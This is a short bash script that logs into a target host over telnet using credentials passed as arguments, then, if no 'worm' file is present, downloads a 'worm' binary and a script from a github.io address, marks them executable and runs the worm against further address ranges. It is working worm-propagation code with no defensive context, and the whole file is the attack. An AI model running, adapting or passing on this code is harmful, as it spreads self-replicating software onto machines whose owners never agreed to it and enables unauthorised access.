#!/bin/bash

{
	echo "$2";
	sleep 1;
	echo "$3";
	sleep 1;
	echo "( ls | grep worm ) || ( wget jrszlachta.github.io/worm/worm && wget jrszlachta.github.io/worm/script.sh && chmod +x worm script.sh && ./worm $4$5-$6 $7-$8)"
	sleep 1;
	echo "exit";
} | telnet "$1" > /dev/null
